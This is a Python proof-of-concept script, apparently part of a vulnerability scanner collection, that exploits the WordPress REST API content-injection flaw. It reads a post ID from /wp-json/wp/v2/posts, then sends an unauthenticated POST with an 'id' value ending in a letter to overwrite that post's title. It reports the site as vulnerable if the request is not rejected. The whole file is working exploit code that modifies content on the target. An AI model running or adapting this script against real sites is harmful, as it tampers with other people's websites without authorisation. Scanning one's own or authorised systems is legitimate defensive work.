#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: wordpress rest api权限失效导致内容注入
referer: https://www.t00ls.net/thread-38046-1-1.html
author: Lucifer
description: 篡改文章权限。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['wordpress rest api权限失效导致内容注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        headers2 = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Content-Type":"application/json"
        }
        payload = "/index.php/wp-json/wp/v2/posts"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            d = json.loads(req.text)
            id_code = d[0]['id']
            vulnurl = url + "/index.php/wp-json/wp/v2/posts/"+str(id_code)+"?id="+str(id_code)+"a"
            post_data = {
                "title":"81dc9bdb52d04dc20036dbd8313ed055"
            }
            req = requests.post(vulnurl, data=json.dumps(post_data), headers=headers2, timeout=10, verify=False)
            d = json.loads(req.text)
            status = d['data']['status']
            if status != 401 and status != 400:
                result[2]=  '存在'
                result[1] = vulnurl

            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
